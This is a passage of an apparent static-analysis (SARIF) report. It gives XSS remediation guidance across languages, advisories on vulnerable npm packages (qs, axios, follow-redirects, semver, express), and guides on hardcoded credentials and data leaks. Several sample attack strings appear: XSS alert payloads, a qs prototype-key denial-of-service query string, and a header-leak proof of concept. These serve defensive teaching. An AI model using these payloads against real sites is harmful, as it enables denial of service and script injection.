taglib uri=\"http://java.sun.com/jsp/jstl/core\" prefix=\"c\" %>\n<h1>Hello, <c:out value=\"${user.name}\"/></h1>\n```\n\n```html\n<%@ taglib uri=\"http://java.sun.com/jsp/jstl/functions\" prefix=\"fn\" %>\n<h1>Hello, ${fn:escapeXml(user.name)}</h1>\n```\n\nNote that a lot of information from the JSP and servlet context is attacker-controlled, so don't forget to escape this data.\n\n## XSS Protection in Regular Java\n\nIf your code manually constructs HTML (e.g. in a servlet) you need to escape any dynamic content before writing it. For example, you may use \n`org.apache.commons.lang.StringEscapeUtils.escapeHtml()` method from the Apache \n`commons-lang` library or the `org.springframework.web.util.HtmlUtils` class from the Spring framework for that purpose.\n\n:::\n\n:::tab[Angular]\n\n## XSS Protection in Angular\n\nAngular is safe by default and escapes all dynamic values automatically. The\nexception are the `bypassSecurityTrust*` functions in the `DomSanitizer` object.\nCarefully audit every use of these functions to make sure they are not used with\nuntrusted input.\n\nUsing these functions with untrusted data immediately opens the door to XSS\nattacks:\n\n```typescript\nimport { Component, OnInit } from '@angular/core';\nimport {DomSanitizer} from '@angular/platform-browser'\n\n@Component({\n  selector: 'component-with-dom-sanitizer',\n  template: '<div [innerHTML]=\"html\"></div>', // include HTML content from 'this.html'\n})\nexport class ComponentWithDomSanitizer implements OnInit {\n  html: SafeHtml;\n\n  constructor(private sanitizer: DomSanitizer) {}\n\n  ngOnInit(): void {\n    // never use with untrusted/partially trusted input!\n    // if you are uncertain, prefer this.sanitizer.sanitize()\n    this.html = this.sanitizer.bypassSecurityTrustHtml('<img src=\"broken\" onerror=\"alert(\\'Hello XSS!\\')\">') ;\n  }\n}\n```\n\n:::\n\n:::tab[C#]\n\n## XSS Protection in C#\n\nThe Razor template language escapes dynamic content automatically when using the @ symbol for interpolation. The following snippet writes out the untrusted input as `&lt;&quot;script&quot;&gt;` when rendering the HTML, safely defusing any\npotential XSS attacks:\n\n```html\n@{\n    var untrustedInput = \"<\\\"script\\\">\";\n}\n\n<h1>@untrustedInput</h1>\n```\n\nThis can be overridden using the `Html.Raw()` method - opening up the possibility of XSS attacks:\n\n```html\n<!-- this is vulnerable to XSS -->\n<div data-url=\"@Html.Raw(untrustedInput)\"></div>\n```\n\nCarefully audit every use of `Html.Raw()` to make sure it is not used with untrusted data.\n\n### Manual Escaping\n\nIf you are constructing HTML outside a template you must remember to manually\nHTML-escape dynamic data. One option for this is the `System.Web.HttpUtility.HtmlEncode()` method.\n\n:::\n\n:::tab[Go]\n\n## XSS Protection in Go\n\nThe `html/template` package is safe by default, automatically escaping dynamic content. For example, the following snippet:\n\n```go\nimport \"html/template\"\n\nt, err := template.New(\"template\").Parse(`{{define \"T\"}}Hello, {{.}}!{{end}}`)\nerr = t.ExecuteTemplate(out, \"T\", \"<script>alert('Hacked!')</script>\")\n```\n\n...writes escaped HTML to the `out` variable. This is in contrast to the `text/template` package which does not provide\nsuch protection.\n\n### Manual Escaping\n\nIf you are constructing HTML outside a template you must remember to manually\nHTML-escape dynamic data. You can use the `html/template.HTMLEscapeString()` function\nfor this.\n\n:::\n\n:::tab[JavaScript]\n\n## XSS Protection in JavaScript\n\nMany template languages escape dynamic content by default, unless you add a directive telling them not to. For instance,\nthe Nunjucks\ntemplate language automatically escapes anything between curly braces:\n\n```\n<!-- Will print &lt;script&gt; in the HTML. -->\n{{ \"<script>\" }}\n```\n\nThis behavior can be overridden, however, creating the possibility of vulnerabilities. In Nunjucks, one way\nof doing this are by using the `safe` keyword (which tells the template engine you consider the source trustworthy):\n\n```\n<!-- Will print <script> in the HTML, which is not safe! -->\n{{ \"<script>\" | safe }}\n```\n\nAnother way such templates become vulnerable is when HTML-escaping is disabled globally:\n\n```javascript\n// bad: this asks for your app to be vulnerable to XSS attacks\nnunjucks.configure({ autoescape: false });\n```\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings you need to escape any dynamic\ncontent manually. One way of doing this by using the `escape-html` Node module:\n\n```javascript\nconst escape = require('escape-html')\nconst html   = escape('<script>')     // Will return &lt;script&gt;\n```\n\n:::\n\n:::tab[Python]\n\n## XSS Protection in Python\n\nMost Python template languages escape dynamic content by default unless you add a directive telling them not to. For instance,\nJinja2 template language automatically escapes anything between curly braces:\n\n```\n<!-- Will print &lt;script&gt; in the HTML. -->\n{{ \"<script>\" }}\n```\n\nTemplate languages allow this behavior to be overridden, however, which can create an XSS vulnerability. In Jinja2, this is done with the `safe` keyword (which tells the template engine you consider the source trustworthy):\n\n```\n<!-- Will print <script> in the HTML, which is not safe! -->\n{{ \"<script>\" | safe }}\n```\n\nAnother way your templates can become vulnerable is by adding the `{% autoescape false %}` directive, which disables escaping for the whole template. Avoid using it.\n\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings, you are responsible for escaping any\ndynamic content possibly coming from an untrusted source. In Python, the builtin `html` module provides the `escape()` function for this purpose:\n\n```python\nimport html\n\n# Will return &lt;script%gt;\nhtml.escape(\"<script>\")\n```\n\n:::\n\n:::tab[React]\n\n## XSS Protection in React\n\nBy default, React escapes any dynamic content you use to construct elements. For example, if some malicious\nJavaScript is passed in the malicious query string parameter, the following snippet is *still* safe:\n\n```jsx\nimport useSearchParams from 'react-router-dom'\n\nfunction SearchBar() {\n  const [searchParams, setSearch] = useSearchParams();\n  const searchParam = searchParams.get(\"search\");\n  \n  return (\n    <input type=\"text\" value={search} onChange={updateSearch} className=\"search-bar\" />\n  );\n}\n```\n\nTo disable auto-escaping in React, you would use the property `dangerouslySetInnerHTML`. Only use this with fully trusted or already HTML-escaped data, or your application is vulnerable to XSS attacks.\n\n```jsx\n<div className=\"search-bar\">\n  <!-- vulnerable! -->\n  <div dangerouslySetInnerHTML={{ __html: searchParam }}>\n  </div>\n</div>\n```\n\n\n:::\n\n:::tab[Scala]\n\n## XSS Protection in Scala\n\nMost template languages in Scala escape dynamic content by default. The popular Play framework escapes dynamic\ncontent by default when you use the following form:\n\n```html\n<p>\n  @(article.content)\n</p>\n```\n\nYou can opt out of this protection by using `@Html()`. Due to the dangers of XSS vulnerabilities, carefully audit every use to ensure the data comes from a trusted source or is HTML-escaped in another step.\n\n```html\n<p>\n  <!-- dangerous! -->\n  @Html(article.content)\n</p>\n```\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings you need to escape any dynamic\ncontent before you write it to the output stream. If you use the play framework you can use the `play.api.templates.HtmlFormat.escape()` method for this. Other options are the\n`org.apache.commons.lang.StringEscapeUtils.escapeHtml()` method from the Apache\n`commons-lang` library or the `org.springframework.web.util.HtmlUtils` class from the Spring framework.\n\n\n:::\n\n:::tab[PHP]\n\n## XSS Protection in PHP\n\nIn PHP, HTML is not escaped by default, making it susceptible to Cross-Site Scripting attacks if proper measures are not taken. Below is a simple example demonstrating how one might inadvertently allow for XSS:\n\n```php\n<?php\n$userName = $_GET['username'];\n?>\n<h1>Hello, <?=$userName?></h1> <!-- bad: users can inject HTML or JavaScript here -->\n```\n\nBy directly echoing user input, you expose yourself to potential XSS vulnerabilities. A common string to show that an attack is possible is: `<script>alert('XSS!');</script>`\n\n### Mitigation\n\nIdeally, use a templating engine or frontend framework that protect against XSS by default by requiring special syntax for raw HTML output. The builtin PHP templating has no such protections, but for example the Blade template engine from Laravel does.\n\nWhen you are dealing with legacy code that uses a template engine with insecure defaults, you must remember to manually escape any output that could potentially contain user-controlled data. This is highly discouraged because it is so easy to forget, or overlook an obscure way that attacker-controlled inputs can actually end up in dynamic output. Still, if you have to do it, the most basic way to do this in PHP is using the built-in `htmlspecialchars` function:\n\n```php\n<?php\n$userName = $_GET['username'];\n$safeUserName = htmlspecialchars($userName, ENT_QUOTES, 'UTF-8');\n?>\n<h1>Hello, <?=$safeUserName?></h1> <!-- safe: characters like < and > are converted to their HTML entities -->\n```\n\nBy using `htmlspecialchars`, the input string is made safe for displaying in HTML by converting characters like `<` and `>` into their respective HTML entities (`&lt;` and `&gt;`), preventing them from being interpreted as HTML or JavaScript by the browser.\n\nHowever, ensure you always use `htmlspecialchars` or similar functions whenever you're outputting data that might contain user input, not just in this specific context. Also, use context-aware output functions when working with JavaScript, CSS, or URL parameters to prevent XSS in those contexts.\n\nRemember, avoiding XSS is not only about protecting against `<script>` tags, but also about preventing attackers from manipulating HTML in ways that can lead to data theft, defacement, or other malicious activities.\n\n:::\n\n::::\n\n## CWEs\n\n* [CWE-79](https://cwe.mitre.org/data/definitions/79.html)"
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/79.html",
                            "id": "warning-sink-html/ebbe1949a2097c63b00f92da013e4554",
                            "name": "Cross-Site Scripting: Non-Constant Html Content In Imagelookup.js:get",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "8",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 8",
                                    "CWE 79",
                                    "Cross-Site Scripting",
                                    "OWASP 2021 a03-injection",
                                    "OWASP a03-2021-injection",
                                    "OWASP a7-xss"
                                ]
                            },
                            "shortDescription": {
                                "text": "Cross-Site Scripting: Non-Constant HTML Content in ImageLookup.js:get"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Versions of the package semver before 7.5.2 on the 7.x branch, before 6.3.1 on the 6.x branch, and all other versions before 5.7.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range."
                            },
                            "help": {
                                "markdown": "Versions of the package semver before 7.5.2 on the 7.x branch, before 6.3.1 on the 6.x branch, and all other versions before 5.7.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range.",
                                "text": "Versions of the package semver before 7.5.2 on the 7.x branch, before 6.3.1 on the 6.x branch, and all other versions before 5.7.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range."
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/1333.html",
                            "id": "oss_vuln/c4ad96b7a3137242fb24e48ccceefb32",
                            "name": "Pkg:npm/Semver@5.7.1",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "5.3",
                                "tags": [
                                    "ng-sast",
                                    "CVE-2022-25883",
                                    "CVSS 5.3",
                                    "CWE 1035",
                                    "CWE 1333",
                                    "CWE 937",
                                    "No exploits",
                                    "Unreachable"
                                ]
                            },
                            "shortDescription": {
                                "text": "pkg:npm/semver@5.7.1"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "An issue discovered in Axios 1.5.1 inadvertently reveals the confidential XSRF-TOKEN stored in cookies by including it in the HTTP header X-XSRF-TOKEN for every request made to any host allowing attackers to view sensitive information."
                            },
                            "help": {
                                "markdown": "An issue discovered in Axios 1.5.1 inadvertently reveals the confidential XSRF-TOKEN stored in cookies by including it in the HTTP header X-XSRF-TOKEN for every request made to any host allowing attackers to view sensitive information.",
                                "text": "An issue discovered in Axios 1.5.1 inadvertently reveals the confidential XSRF-TOKEN stored in cookies by including it in the HTTP header X-XSRF-TOKEN for every request made to any host allowing attackers to view sensitive information."
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/1035.html",
                            "id": "oss_vuln/cea1d01439a7a89f26d0765509f199c2",
                            "name": "Pkg:npm/Axios@0.19.0",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "6.5",
                                "tags": [
                                    "ng-sast",
                                    "CVE-2023-45857",
                                    "CVSS 6.5",
                                    "CWE 1035",
                                    "CWE 352",
                                    "CWE 937",
                                    "No exploits",
                                    "Reachable"
                                ]
                            },
                            "shortDescription": {
                                "text": "pkg:npm/axios@0.19.0"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "qs before 6.10.3, as used in Express before 4.17.3 and other products, allows attackers to cause a Node process hang for an Express application because an __ proto__ key can be used. In many typical Express use cases, an unauthenticated remote attacker can place the attack payload in the query string of the URL that is used to visit the application, such as a[__proto__]=b&a[__proto__]&a[length]=100000000. The fix was backported to qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3, and 6.2.4 (and therefore Express 4.17.3, which has \"deps: qs@6.9.7\" in its release description, is not vulnerable)."
                            },
                            "help": {
                                "markdown": "qs before 6.10.3, as used in Express before 4.17.3 and other products, allows attackers to cause a Node process hang for an Express application because an __ proto__ key can be used. In many typical Express use cases, an unauthenticated remote attacker can place the attack payload in the query string of the URL that is used to visit the application, such as a[__proto__]=b&a[__proto__]&a[length]=100000000. The fix was backported to qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3, and 6.2.4 (and therefore Express 4.17.3, which has \"deps: qs@6.9.7\" in its release description, is not vulnerable).",
                                "text": "qs before 6.10.3, as used in Express before 4.17.3 and other products, allows attackers to cause a Node process hang for an Express application because an __ proto__ key can be used. In many typical Express use cases, an unauthenticated remote attacker can place the attack payload in the query string of the URL that is used to visit the application, such as a[__proto__]=b&a[__proto__]&a[length]=100000000. The fix was backported to qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3, and 6.2.4 (and therefore Express 4.17.3, which has \"deps: qs@6.9.7\" in its release description, is not vulnerable)."
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/1035.html",
                            "id": "oss_vuln/6a27c8d9849614f37b72ad1ca17b666c",
                            "name": "Pkg:npm/Express@4.17.1",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "7.5",
                                "tags": [
                                    "ng-sast",
                                    "CVE-2022-24999",
                                    "CVSS 7.5",
                                    "CWE 1035",
                                    "CWE 1321",
                                    "CWE 937",
                                    "No exploits",
                                    "Reachable"
                                ]
                            },
                            "shortDescription": {
                                "text": "pkg:npm/express@4.17.1"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Versions of the package follow-redirects before 1.15.4 is vulnerable to Improper Input Validation due to the improper handling of URLs by the url.parse() function. When new URL() throws an error, it can be manipulated to misinterpret the hostname. An attacker could exploit this weakness to redirect traffic to a malicious site, potentially leading to information disclosure, phishing attacks, or other security breaches."
                            },
                            "help": {
                                "markdown": "Versions of the package follow-redirects before 1.15.4 is vulnerable to Improper Input Validation due to the improper handling of URLs by the url.parse() function. When new URL() throws an error, it can be manipulated to misinterpret the hostname. An attacker could exploit this weakness to redirect traffic to a malicious site, potentially leading to information disclosure, phishing attacks, or other security breaches.",
                                "text": "Versions of the package follow-redirects before 1.15.4 is vulnerable to Improper Input Validation due to the improper handling of URLs by the url.parse() function. When new URL() throws an error, it can be manipulated to misinterpret the hostname. An attacker could exploit this weakness to redirect traffic to a malicious site, potentially leading to information disclosure, phishing attacks, or other security breaches."
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/1035.html",
                            "id": "oss_vuln/5888ff54ef2ab2acee7ede441ff3b18b",
                            "name": "Pkg:npm/Follow-Redirects@1.5.10",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "7.3",
                                "tags": [
                                    "ng-sast",
                                    "CVE-2023-26159",
                                    "CVSS 7.3",
                                    "CWE 1035",
                                    "CWE 20",
                                    "CWE 937",
                                    "No exploits",
                                    "Unreachable"
                                ]
                            },
                            "shortDescription": {
                                "text": "pkg:npm/follow-redirects@1.5.10"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "When using axios, its dependency library follow-redirects only clears authorization header during cross-domain redirect, but allows the proxy-authentication header which contains credentials too."
                            },
                            "help": {
                                "markdown": "When using axios, its dependency library follow-redirects only clears authorization header during cross-domain redirect, but allows the proxy-authentication header which contains credentials too.\n\nSteps To Reproduce & PoC\n\naxios Test Code\n\nconst axios = require('axios');\n\naxios.get('http://127.0.0.1:10081/',{\n    headers: {\n        'AuThorization': 'Rear Test',\n        'ProXy-AuthoriZation': 'Rear Test',\n        'coOkie': 't=1'\n    }\n    }).then(function (response) {\n        console.log(response);\n})\nWhen I meet the cross-domain redirect, the sensitive headers like authorization and cookie are cleared, but proxy-authentication header is kept.\n\nRequest sent by axios\n\nimage-20240314130755052.png\nRequest sent by follow-redirects after redirectimage-20240314130809838.png\n\nImpact\n\nThis vulnerability may lead to credentials leak.\n\nRecommendations\n\nRemove proxy-authentication header during cross-domain redirect\nRecommended Patch\n\nfollow-redirects/index.js:464\n\nremoveMatchingHeaders(/^(?:authorization|cookie)$/i, this._options.headers);\nchange to\n\nremoveMatchingHeaders(/^(?:authorization|proxy-authorization|cookie)$/i, this._options.headers);\nRef\n\nhttps://fetch.spec.whatwg.org/#authentication-entries\nhttps://hackerone.com/reports/2390009",
                                "text": "When using axios, its dependency library follow-redirects only clears authorization header during cross-domain redirect, but allows the proxy-authentication header which contains credentials too.\n\nSteps To Reproduce & PoC\n\naxios Test Code\n\nconst axios = require('axios');\n\naxios.get('http://127.0.0.1:10081/',{\n    headers: {\n        'AuThorization': 'Rear Test',\n        'ProXy-AuthoriZation': 'Rear Test',\n        'coOkie': 't=1'\n    }\n    }).then(function (response) {\n        console.log(response);\n})\nWhen I meet the cross-domain redirect, the sensitive headers like authorization and cookie are cleared, but proxy-authentication header is kept.\n\nRequest sent by axios\n\nimage-20240314130755052.png\nRequest sent by follow-redirects after redirectimage-20240314130809838.png\n\nImpact\n\nThis vulnerability may lead to credentials leak.\n\nRecommendations\n\nRemove proxy-authentication header during cross-domain redirect\nRecommended Patch\n\nfollow-redirects/index.js:464\n\nremoveMatchingHeaders(/^(?:authorization|cookie)$/i, this._options.headers);\nchange to\n\nremoveMatchingHeaders(/^(?:authorization|proxy-authorization|cookie)$/i, this._options.headers);\nRef\n\nhttps://fetch.spec.whatwg.org/#authentication-entries\nhttps://hackerone.com/reports/2390009"
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/200.html",
                            "id": "oss_vuln/fb8218b438222d5bbea8f11a14a524cd",
                            "name": "Pkg:npm/Follow-Redirects@1.5.10",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "6.5",
                                "tags": [
                                    "ng-sast",
                                    "CVE-2024-28849",
                                    "CVSS 6.5",
                                    "CWE 1035",
                                    "CWE 200",
                                    "CWE 937",
                                    "No exploits",
                                    "Unreachable"
                                ]
                            },
                            "shortDescription": {
                                "text": "pkg:npm/follow-redirects@1.5.10"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "qs before 6.10.3 allows attackers to cause a Node process hang because an `__ proto__` key can be used. In many typical web framework use cases, an unauthenticated remote attacker can place the attack payload in the query string of the URL that is used to visit the application, such as `a[__proto__]=b&a[__proto__]&a[length]=100000000`. The fix was backported to qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3, and 6.2.4."
                            },
                            "help": {
                                "markdown": "qs before 6.10.3 allows attackers to cause a Node process hang because an `__ proto__` key can be used. In many typical web framework use cases, an unauthenticated remote attacker can place the attack payload in the query string of the URL that is used to visit the application, such as `a[__proto__]=b&a[__proto__]&a[length]=100000000`. The fix was backported to qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3, and 6.2.4.",
                                "text": "qs before 6.10.3 allows attackers to cause a Node process hang because an `__ proto__` key can be used. In many typical web framework use cases, an unauthenticated remote attacker can place the attack payload in the query string of the URL that is used to visit the application, such as `a[__proto__]=b&a[__proto__]&a[length]=100000000`. The fix was backported to qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3, and 6.2.4."
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/1321.html",
                            "id": "oss_vuln/24944ed75d8858c7d9783f771d9f135b",
                            "name": "Pkg:npm/Qs@6.7.0",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "7.5",
                                "tags": [
                                    "ng-sast",
                                    "CVE-2022-24999",
                                    "CVSS 7.5",
                                    "CWE 1035",
                                    "CWE 1321",
                                    "CWE 937",
                                    "No exploits",
                                    "Unreachable"
                                ]
                            },
                            "shortDescription": {
                                "text": "pkg:npm/qs@6.7.0"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "note",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Credentials are hardcoded, allowing everyone with access to the source code or compilation."
                            },
                            "help": {
                                "markdown": "Credentials are hardcoded, allowing everyone with access to the source code or compilation\n artifacts to impersonate the application and access protected data or systems.\n ## Countermeasures\n - Retrieve credentials from a secured location only accessible from the production environment.\n ## Additional information\n **[CWE-259](https://cwe.mitre.org/data/definitions/259.html)**\n **[CWE-798](https://cwe.mitre.org/data/definitions/798.html)**\n **[OWASP-a3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_a3-Sensitive_Data_Exposure)**",
                                "text": "Credentials are hardcoded, allowing everyone with access to the source code or compilation\n artifacts to impersonate the application and access protected data or systems.\n ## Countermeasures\n - Retrieve credentials from a secured location only accessible from the production environment.\n ## Additional information\n **[CWE-259](https://cwe.mitre.org/data/definitions/259.html)**\n **[CWE-798](https://cwe.mitre.org/data/definitions/798.html)**\n **[OWASP-a3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_a3-Sensitive_Data_Exposure)**"
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/259.html",
                            "id": "hardcoded-credentials/718c472dfdc218d3f7463ebb0caa8dca",
                            "name": "Hardcoded Credentials: Hardcoded Credentials Used In Authentication Or Encryption Operation In Login.js:encryptdata",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "3",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 3",
                                    "CWE 259",
                                    "CWE 798",
                                    "Hardcoded Credentials",
                                    "OWASP 2021 a07-identification-and-authentication-failures",
                                    "OWASP a07-2021-identification-and-authentication-failures",
                                    "OWASP a3-sensitive-data-exposure"
                                ]
                            },
                            "shortDescription": {
                                "text": "Hardcoded Credentials: Hardcoded Credentials Used in Authentication or Encryption Operation in Login.js:encryptData"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Sensitive data is logged in this flow."
                            },
                            "help": {
                                "markdown": "Sensitive data is logged in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop 